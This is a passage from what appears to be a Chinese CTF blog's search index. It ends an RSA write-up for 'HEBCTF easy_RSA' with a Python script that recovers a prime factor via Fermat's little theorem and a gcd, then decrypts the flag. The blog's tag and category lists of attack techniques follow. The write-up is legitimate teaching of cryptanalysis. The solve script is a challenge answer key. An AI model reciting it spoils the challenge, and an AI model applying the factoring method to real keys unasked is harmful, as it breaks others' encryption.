8127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625print(enc)#enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810 代码分析 1、代码中没有给出e的值，猜测是常见的e值，尝试了65535、65537。 2、代码中给出了d和p的关系，因此可利用费马小定理求解。【费马小定理】如果p是一个质数，而整数a不是p的倍数，则有a^(p-1)≡1 mod p。 解题过程1、我们可以设A = m^(p-1)-1，其中m^(p-1) ≡ 1 mod p，故A是p的倍数，由于N = p*q，因此gcd(A,N)=p。2、由m^e ≡ c mod N得到 c = m^e - b*N（b是整数）。3、又因为 c^d ≡ m mod N，所以(m^e - b*N)^d = m mod N，进一步(m^e)^d = m mod N。4、等式两边取p-1次方，得到：(m^ed)^(p-1) mod N = m^(p-1) mod N，即：m^e(s-n) mod N = m^(p-1) mod N。5、得到A = (m^e(s-n) mod N)-1，即可求得p = gcd(A,N)。 代码如下import gmpy2from Crypto.Util.number import *n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943enc=4881342612605167945566362034399587836635894621851547317823874228263412784935124440289546702719504165280607577300320293348921200397520285704213654018930232712940345612671113541266347784516634193958010265082924711886924437824841465114124020180216977559637341458252243825701112061216139287782944762861273904099742150098423639841865509382899243178009016015415485229031954926669538913188143653236257937229799801229863924027941144675212479223330496722053292471015086437410831685022807918456036289520338369388719529672585641297779845250083115247220743517626420017412100344704837819753505113936564984505444789009239645210810something=286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625nothing=251560377963038761190200797029988859033e = 65537A=pow(2,e*something-e*nothing,n)-1p = gmpy2.gcd(A,n)q = n // pd = gmpy2.invert(e,(p-1)*(q-1))m = pow(enc, d, n)flag = long_to_bytes(m)print(flag)","link":"/2020/02/02/HEBCTF-easy_RSA-WriteUp/"}],"tags":[{"name":"XXE攻击","slug":"XXE攻击","link":"/tags/XXE%E6%94%BB%E5%87%BB/"},{"name":"ImageTragick","slug":"ImageTragick","link":"/tags/ImageTragick/"},{"name":"条件竞争","slug":"条件竞争","link":"/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"},{"name":"Cookie攻击","slug":"Cookie攻击","link":"/tags/Cookie%E6%94%BB%E5%87%BB/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"布尔盲注","slug":"布尔盲注","link":"/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"00截断","slug":"00截断","link":"/tags/00%E6%88%AA%E6%96%AD/"},{"name":"命令注入","slug":"命令注入","link":"/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","link":"/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"哈希长度扩展攻击","slug":"哈希长度扩展攻击","link":"/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"302跳转","slug":"302跳转","link":"/tags/302%E8%B7%B3%E8%BD%AC/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"phar反序列化漏洞","slug":"phar反序列化漏洞","link":"/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化逃逸漏洞","slug":"反序列化逃逸漏洞","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"},{"name":"http协议走私","slug":"http协议走私","link":"/tags/http%E5%8D%8F%E8%AE%AE%E8%B5%B0%E7%A7%81/"},{"name":"SSRF","slug":"SSRF","link":"/tags/SSRF/"},{"name":"user.ini上传漏洞","slug":"user-ini上传漏洞","link":"/tags/user-ini%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"perl下利用open命令进行RCE","slug":"perl下利用open命令进行RCE","link":"/tags/perl%E4%B8%8B%E5%88%A9%E7%94%A8open%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8CRCE/"},{"name":"XFF注入","slug":"XFF注入","link":"/tags/XFF%E6%B3%A8%E5%85%A5/"},{"name":"二次注入","slug":"二次注入","link":"/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"栈溢出","slug":"栈溢出","link":"/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"bypass functions_disable","slug":"bypass-functions-disable","link":"/tags/bypass-functions-disable/"},{"name":"蚁剑","slug":"蚁剑","link":"/tags/%E8%9A%81%E5%89%91/"},{"name":"流量分析","slug":"流量分析","link":"/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"RSA攻击","slug":"RSA攻击","link":"/tags/RSA%E6%94%BB%E5%87%BB/"},{"name":"低加密指数广播攻击","slug":"低加密指数广播攻击","link":"/tags/%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"FTP","slug":"FTP","link":"/tags/FTP/"},{"name":"webshell","slug":"webshell","link":"/tags/webshell/"},{"name":"IO_FILE漏洞","slug":"IO-FILE漏洞","link":"/tags/IO-FILE%E6%BC%8F%E6%B4%9E/"},{"name":"INDA漏洞","slug":"INDA漏洞","link":"/tags/INDA%E6%BC%8F%E6%B4%9E/"},{"name":"HTTP请求伪造","slug":"HTTP请求伪造","link":"/tags/HTTP%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"name":"堆叠注入","slug":"堆叠注入","link":"/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"PHP伪协议","slug":"PHP伪协议","link":"/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"Python反序列化漏洞","slug":"Python反序列化漏洞","link":"/tags/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"Unicode安全问题","slug":"Unicode安全问题","link":"/tags/Unicode%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"name":"JWT伪造","slug":"JWT伪造","link":"/tags/JWT%E4%BC%AA%E9%80%A0/"},{"name":"薅羊毛逻辑漏洞","slug":"薅羊毛逻辑漏洞","link":"/tags/%E8%96%85%E7%BE%8A%E6%AF%9B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"SSTI模板注入","slug":"SSTI模板注入","link":"/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"MD5强比较","slug":"MD5强比较","link":"/tags/MD5%E5%BC%BA%E6%AF%94%E8%BE%83/"},{"name":"无参数RCE","slug":"无参数RCE","link":"/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"},{"name":"open-basedir绕过","slug":"open-basedir绕过","link":"/tags/open-basedir%E7%BB%95%E8%BF%87/"},{"name":"htaccess解析","slug":"htaccess解析","link":"/tags/htaccess%E8%A7%A3%E6%9E%90/"},{"name":"RSA费马小定理攻击","slug":"RSA费马小定理攻击","link":"/tags/RSA%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86%E6%94%BB%E5%87%BB/"},{"name":"NTFS数据流隐藏","slug":"NTFS数据流隐藏","link":"/tags/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E8%97%8F/"},{"name":"NTFS特性上传绕过","slug":"NTFS特性上传绕过","link":"/tags/NTFS%E7%89%B9%E6%80%A7%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"},{"name":"域渗透","slug":"域渗透","link":"/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"CVE-2014-6324域控提权","slug":"CVE-2014-6324域控提权","link":"/tags/CVE-2014-6324%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"},{"name":"MaliciousCode","slug":"MaliciousCode","link":"/tags/MaliciousCode/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"php伪随机","slug":"php伪随机","link":"/tags/php%E4%BC%AA%E9%9A%8F%E6%9C%BA/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"RSA频率表攻击","slug":"RSA频率表攻击","link":"/tags/RSA%E9%A2%91%E7%8E%87%E8%A1%A8%E6%94%BB%E5%87%BB/"},{"name":"RSA逐字节爆破","slug":"RSA逐字节爆破","link":"/tags/RSA%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4/"},{"name":"FFI","slug":"FFI","link":"/tags/FFI/"},{"name":"ImageMagick","slug":"ImageMagick","link":"/tags/ImageMagick/"},{"name":"分组密码重放攻击","slug":"分组密码重放攻击","link":"/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB/"},{"name":"无列名查询","slug":"无列名查询","link":"/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2/"},{"name":"ERB模板注入","slug":"ERB模板注入","link":"/tags/ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"CVE-2016-5385代理伪造","slug":"CVE-2016-5385代理伪造","link":"/tags/CVE-2016-5385%E4%BB%A3%E7%90%86%E4%BC%AA%E9%80%A0/"},{"name":"CVE-2020-7245","slug":"CVE-2020-7245","link":"/tags/CVE-2020-7245/"},{"name":"tcpdump获取数据包端口","slug":"tcpdump获取数据包端口","link":"/tags/tcpdump%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85%E7%AB%AF%E5%8F%A3/"},{"name":"golang","slug":"golang","link":"/tags/golang/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"Tor","slug":"Tor","link":"/tags/Tor/"},{"name":"obfs4网桥","slug":"obfs4网桥","link":"/tags/obfs4%E7%BD%91%E6%A1%A5/"},{"name":"ELF文件保护机制","slug":"ELF文件保护机制","link":"/tags/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"堆溢出","slug":"堆溢出","link":"/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"时间盲注","slug":"时间盲注","link":"/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"name":"宽字节注入","slug":"宽字节注入","link":"/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"},{"name":"利用正则注入","slug":"利用正则注入","link":"/tags/%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/"},{"name":"利用Handler注入","slug":"利用Handler注入","link":"/tags/%E5%88%A9%E7%94%A8Handler%E6%B3%A8%E5%85%A5/"},{"name":"利用预处理语句进行堆叠注入","slug":"利用预处理语句进行堆叠注入","link":"/tags/%E5%88%A9%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"},{"name":"多列数据爆破注入","slug":"多列数据爆破注入","link":"/tags/%E5%A4%9A%E5%88%97%E6%95%B0%E6%8D%AE%E7%88%86%E7%A0%B4%E6%B3%A8%E5%85%A5/"},{"name":"PDF417识别","slug":"PDF417识别","link":"/tags/PDF417%E8%AF%86%E5%88%AB/"},{"name":"F5隐写","slug":"F5隐写","link":"/tags/F5%E9%9A%90%E5%86%99/"},{"name":"ThinkPHP6.0-通过SEESION写文件漏洞","slug":"ThinkPHP6-0-通过SEESION写文件漏洞","link":"/tags/ThinkPHP6-0-%E9%80%9A%E8%BF%87SEESION%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"Rabin算法攻击","slug":"Rabin算法攻击","link":"/tags/Rabin%E7%AE%97%E6%B3%95%E6%94%BB%E5%87%BB/"},{"name":"RSA共模攻击","slug":"RSA共模攻击","link":"/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"},{"name":"JS原型链污染","slug":"JS原型链污染","link":"/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"CRLF注入","slug":"CRLF注入","link":"/tags/CRLF%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"NodeJS","slug":"NodeJS","link":"/tags/NodeJS/"},{"name":"NodeJS编码安全","slug":"NodeJS编码安全","link":"/tags/NodeJS%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8/"},{"name":"Machine Learning","slug":"Machine-Learning","link":"/tags/Machine-Learning/"},{"name":"Neural Network","slug":"Neural-Network","link":"/tags/Neural-Network/"},{"name":"Paillier加密","slug":"Paillier加密","link":"/tags/Paillier%E5%8A%A0%E5%AF%86/"},{"name":"Integer Overflow","slug":"Integer-Overflow","link":"/tags/Integer-Overflow/"},{"name":"md5碰撞","slug":"md5碰撞","link":"/tags/md5%E7%A2%B0%E6%92%9E/"},{"name":"md5弱比较","slug":"md5弱比较","link":"/tags/md5%E5%BC%B1%E6%AF%94%E8%BE%83/"},{"name":"md5强比较","slug":"md5强比较","link":"/tags/md5%E5%BC%BA%E6%AF%94%E8%BE%83/"},{"name":"CRC32爆破","slug":"CRC32爆破","link":"/tags/CRC32%E7%88%86%E7%A0%B4/"},{"name":"双写注入","slug":"双写注入","link":"/tags/%E5%8F%8C%E5%86%99%E6%B3%A8%E5%85%A5/"},{"name":"PHP7解析特性bypass","slug":"PHP7解析特性bypass","link":"/tags/PHP7%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7bypass/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"arm pwn","slug":"arm-pwn","link":"/tags/arm-pwn/"},{"name":"leak canary","slug":"leak-canary","link":"/tags/leak-canary/"},{"name":"heap UAF","slug":"heap-UAF","link":"/tags/heap-UAF/"},{"name":"Deep Learning","slug":"Deep-Learning","link":"/tags/Deep-Learning/"},{"name":"GPU calculation","slug":"GPU-calculation","link":"/tags/GPU-calculation/"},{"name":"JS沙箱逃逸","slug":"JS沙箱逃逸","link":"/tags/JS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"JS模板字符串","slug":"JS模板字符串","link":"/tags/JS%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"JS弱类型","slug":"JS弱类型","link":"/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"万能密码绕过or过滤","slug":"万能密码绕过or过滤","link":"/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87or%E8%BF%87%E6%BB%A4/"},{"name":"PHP session反序列化漏洞","slug":"PHP-session反序列化漏洞","link":"/tags/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"bypass URL限制","slug":"bypass-URL限制","link":"/tags/bypass-URL%E9%99%90%E5%88%B6/"},{"name":"短命令执行","slug":"短命令执行","link":"/tags/%E7%9F%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"pickle反序列化","slug":"pickle反序列化","link":"/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"伪造mysql-server实现任意读取","slug":"伪造mysql-server实现任意读取","link":"/tags/%E4%BC%AA%E9%80%A0mysql-server%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"web安全","slug":"CTF/web安全","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/"},{"name":"赛题复现","slug":"CTF/赛题复现","link":"/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"name":"比赛划水","slug":"CTF/比赛划水","link":"/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"},{"name":"瞎捉摸的一些学习","slug":"瞎捉摸的一些学习","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"},{"name":"BUU刷题","slug":"CTF/web安全/BUU刷题","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"},{"name":"二进制","slug":"CTF/二进制","link":"/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"CTFHub刷题","slug":"CTF/web安全/CTFHub刷题","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"},{"name":"obfs4网桥搭建","slug":"瞎捉摸的一些学习/obfs4网桥搭建","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"},{"name":"FTP服务器搭建","slug":"瞎捉摸的一些学习/FTP服务器搭建","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"},{"name":"机器学习","slug":"机器学习","link":"/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"恶意代码","slug":"瞎捉摸的一些学习/恶意代码","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]}